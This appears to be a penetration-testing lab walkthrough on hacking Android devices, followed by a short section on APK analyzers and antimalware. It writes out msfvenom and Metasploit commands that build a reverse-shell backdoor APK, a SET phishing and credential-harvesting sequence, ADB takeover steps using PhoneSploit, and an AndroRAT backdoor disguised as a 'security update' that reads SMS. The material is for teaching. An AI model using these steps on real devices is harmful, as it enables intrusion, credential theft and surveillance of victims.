# Hacking Mobile Platforms

## Introduction

- Mobile devices play a crucial role in today's communication landscape, facilitating various tasks through radio frequencies such as GSM, LTE, 5G, and Wi-Fi. Despite their convenience, they are susceptible to malicious activities.

- Mobile technology's evolution has made smartphones and tablets integral to daily life, replacing traditional computers for tasks like communication, navigation, and data storage. However, these devices are prone to security threats.


## Objective

The primary objective is to conduct ethical hacking on mobile platforms, specifically targeting Android devices.
- Exploiting Android vulnerabilities
- Obtaining user credentials
- Hacking Android with malicious applications
- Launching a DOS attack
- Exploiting Android through ADB

## Overview of Hacking Mobile Platforms

- Smartphones, widely used for personal and business purposes, are treasure troves for attackers seeking corporate or personal data. Security threats to mobile devices have surged with increased internet connectivity, diverse applications, and communication methods.


## Methods

#### 1. Hack Android Devices
   - Create a binary payload to hack an Android device
   - Use the social engineering toolkit to harvest user credentials
   - Launch a DoS attack with Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform
   - Exploit the Android Platform through ADB using PhoneSploit
   - Hack an Android Device by Creating APK File using AndroRAT

#### 2. Secure Android Devices using Various Android Security Tools
   - Analyze a malicious app using online Android analyzers
   - Secure Android devices from malicious apps using Malwarebytes Security

---
### 1. Hack Android Devices

- Attackers leverage diverse Android hacking tools to pinpoint vulnerabilities and exploit mobile devices, aiming to access critical user information like credentials and personal data. 

- The growing adoption of smartphones and tablets, supporting extensive functionalities, makes Android the leading mobile OS due to its open application platform. However, Android's popularity comes with vulnerabilities, as not all users keep their OS and apps updated. This laxity provides attackers opportunities to exploit weaknesses and execute various attacks, compromising valuable data on victims' devices.

- With the prevalence of bring your own device (BYOD) policies, mobile devices have become prime targets. Attackers exploit vulnerabilities at the device and network layers, data centers, or a combination of these. Ethical hackers and pen testers must be proficient in hacking tools, exploits, and payloads to assess the security infrastructure of network-connected mobile devices.


**Overview of Hacking Android Platforms**

- Android, developed by Google, is a comprehensive software environment for mobile devices, encompassing an OS, middleware, and key applications. Its Linux-based OS is tailored for smartphones and tablets, featuring a stack of software components categorized into six sections and five layers.

- The surge in Android users makes these devices prime targets for hackers. Various hacking tools are employed to discover and exploit vulnerabilities, leading to attacks like DOS, Man-in-the-Disk, and Spear phone attacks.

#### Hack an Android Device by Creating Binary Payload

- Attackers leverage tools like Metasploit to create binary payloads, sent to the target system to gain control. Metasploit, a modular penetration testing platform, allows writing, testing, and executing exploit code. Meterpreter, a Metasploit payload, provides an interactive shell for exploring targets and executing code.


1. **Start Database Service:**
   - Start the PostgreSQL service: `service postgresql start`.

2. **Generate Binary Payload:**
   - Use Metasploit to generate a binary payload:
    ```bash
    msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Backdoor.apk
    ```

3. **Set Up Shared Folder:**
   - Create a shared folder: `mkdir /var/www/html/share`.
   - Set permissions: `chmod -R 755 /var/www/html/share`.
   - Start Apache web server: `service apache2 start`.
   - Copy Backdoor.apk: `cp Backdoor.apk /var/www/html/share/`.

4. **Launch Metasploit:**
   - Launch Metasploit console: `msfconsole`.
   - Inside msfconsole:
     - Set payload: `set payload android/meterpreter/reverse_tcp`.
     - Set LHOST: `set LHOST 10.10.1.13`.
     - Show options: `show options`.
     - Exploit as a background job: `exploit -j -z`.

5. **Switch to Android Emulator:**
   - Restart the Android emulator if non-responsive.

6. **Download and Install Payload:**
   - Visit `http://10.10.1.13/share`.
   - Download Backdoor.apk.

7. **Execute Payload:**
   - Install the downloaded APK.

8. **Explore Meterpreter Session:**
   - Interact with the Meterpreter session:
      - Show available sessions: `sessions -i 1`.
      - View system information: `sysinfo`.
      - Display network interfaces: `ipconfig`.
      - View the current directory: `pwd`.
      - Change the directory: `cd /sdcard`.
      - View processes: `ps`.

#### Harvest Users' Credentials using the Social-Engineer Toolkit

The [Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) is a Python-driven tool for penetration testing via social engineering. It exploits human vulnerabilities by tricking targets into providing sensitive information. In this task, we'll use SET to sniff user credentials on the Android platform.

- Launch Social-Engineer Toolkit using `setoolkit`.

- Select Social-Engineering Attacks: Choose option 1 for Social-Engineering Attacks.

- Choose Website Attack Vectors: Choose option 2 for Website Attack Vectors.

- Credential Harvester Attack Method: Choose option 3 for Credential Harvester Attack Method.

- Site Cloner:
  - Choose option 2 for Site Cloner.
  - Enter IP address (10.10.1.13).
  - Enter URL to clone (e.g., http://github.com).

- Clone Website:
  - Confirm and proceed.
  - Send cloned site's IP to the victim.

- Phishing Email:
  - Compose a phishing email with a fake but enticing link.
  - Insert the cloned site's URL.

- Victim Interaction:
  - Open the email on the Android emulator.
  - Click the malicious link.

- Capture Credentials:
  - In the terminal, observe captured credentials.


#### Exploit the Android Platform through ADB using PhoneSploit

- Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.

- Usually, developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device. In this task, we will exploit the Android platform through ADB using the [PhoneSploit](https://github.com/metachar/PhoneSploit) tool.

- Install Dependencies:
  - Install colorama with `python3 -m pip install colorama`.

- Run PhoneSploit:
  - Launch PhoneSploit with `python3 phonesploit.py`.
  - Select option 3 to connect a new phone.
  - Enter the target Android device's IP address (e.g., 10.10.1.14).

- Access Shell on the Device:
  - Choose option 4 to access the shell on the connected phone.
  - Explore the device's file system using commands like `pwd`, `ls`, `cd`, etc.

- Download a File:
  - Navigate to the target folder (e.g., Download) using `cd Download`.
  - Download a file (e.g., images.jpeg) if needed.

- Take a Screenshot:
  - Exit the shell with `exit`.
  - Choose option 7 to take a screenshot.
  - Enter the device's IP and where to save the screenshot.

- List Installed Apps:
  - Choose option 14 to list all apps on the phone.
  - View the installed apps on the Android device.

- Run an App:
  - Choose option 15 to run an app.
  - Enter the device's IP and the app's package name (e.g., com.android.calculator2).

- Explore Further:
  - Utilize other PhoneSploit options like `Show Mac/lnet information` (option 18) and `NetStat` (option 21).
  - Gain insights into active connections and network information.

- Conclude Exploitation:
  - Experiment with additional options such as `Install an apk`, `Screen record`, `Turn The Device off`, and `Uninstall an app`.


#### Hack an Android Device by Creating APK File using AndroRAT

[AndroRAT](https://github.com/karma9874/AndroRAT) is a tool designed to give control of an Android system to a remote user and to retrieve information from it. AndroRAT is a client/server application developed in Java Android for the client side, and the Server is in Python. AndroRAT provides a fully persistent backdoor to the target device, as the app starts automatically on device boot up. It also obtains the current location, sim card details, IP address, and MAC address of the device.

- Build the APK using AndroRAT.
  ```bash
  python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
  ```

- Copy the APK to the share folder.
  ```bash
  cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
  ```

- If the share folder doesn't exist, create it and set the required permissions.
  ```bash
  mkdir /var/www/html/share
  chmod -R 755 /var/www/html/share
  chown -R www-data:www-data /var/www/html/share
  ```

- Start the Apache web server.
  ```bash
  service apache2 start
  ```

- Start listening for the victim's machine.
  ```bash
  python3 androRAT.py --shell -i 0.0.0.0 -p 4444
  ```

- On the Android virtual machine, launch the browser and visit http://10.10.1.13/share to download the APK.

- Install the malicious app on the Android VM.

- Switch back to Parrot Security. The Interpreter session is open (victim's IP: 10.10.1.14).

- View available commands in the Interpreter session.
  ```bash
  help
  ```

- View device information.
  ```bash
  deviceInfo
  ```

- Obtain SMS from the victim's inbox.
  ```bash
  getSMS inbox
  ```

- View the MAC address of the victim's device.
  ```bash
  getMACAddress
  ```

- Execute additional commands for more information.

- Terminate the Interpreter session.
  ```bash
  exit
  ```

- Explore other Android hacking tools like [NetCut](https://www.arcai.com), [drozer](https://labs.f-secure.com), [zANTI](https://www.zimperium.com), [Network Spoofer](https://www.digitalsquid.co.uk), and [DroidSheep](https://droidsheep.info).


---
### 2. Secure Android Devices using Various Android Security Tools

- Like personal computers, mobile devices store sensitive data and are susceptible to various threats. Therefore, they should be properly secured to prevent the compromise or loss of confidential data, lessen the risk of various threats such as viruses and Trojans, and mitigate other forms of abuse. Strict measures and security tools are vital to strengthening the security of these devices.

#### Analyze a Malicious App using Online Android Analyzers

- Online Android analyzers enable the scanning of Android APK packages, performing security analyses to detect vulnerabilities in specific apps. Trusted analyzers include Sixo Online APK Analyzer.

1. Turn on the Android emulator machine.

2. Switch to the Android machine, launch Chrome.
   - **Note:** Restart the machine if unresponsive.

3. In Chrome, type [Sixo Online APK Analyzer](https://www.sisik.eu/apk-tool) in the address bar.

4. The Sixo Online APK Analyzer webpage loads.

5. Click "Drop APK here" or "click to select file" to upload Backdoor.apk.
   - **Note:** Sixo Online APK Analyzer allows detailed analysis, including decompiling binary XML files and resources.

6. The browser window shows the information about the uploaded file (Backdoor.apk).

7. Scroll down to the "Requested Permissions" section to view app permissions declared in AndroidManifest.xml.

8. Scroll down to the "AndroidManifest.xml" section for essential information about the APK file.

9. Further scroll to view details about APK Signature, App Source Code, etc.

10. Other online Android analyzers include [SandDroid](http://sanddroid.xjtu.edu.cn) and [Apktool](http://www.javadecompilers.com).

11. Additionally, use Android vulnerability scanners like:
    - [X-Ray 2.0](https://duo.com)
    - [Vulners Scanner](https://play.google.com)
    - [Shellshock Scanner Zimperium](https://play.google.com)
    - [Yaazhini](https://www.vegabird.com)
    - [Quick Android Review Kit (QARK)](https://github.com/linkedin/qark) to analyze malicious apps for vulnerabilities.


#### Secure Android Devices from Malicious Apps using Malwarebytes Security

- Malwarebytes is an antimalware mobile tool providing protection against malware, ransomware, and other threats to Android devices. It blocks, detects, and removes adware and malware, conducts privacy audits for apps, and ensures safer browsing.

- Install "Malwarebytes Mobile Security" via playstore.

- Other tools for mobile security include AntiSpy Mobile (https://antispymobile.com), Spyware Detector (https://play.google.com), iAmNotified - Anti Spy System (https://iamnotified.com), and Privacy Scanner (AntiSpy) Free (https://play.google.com).

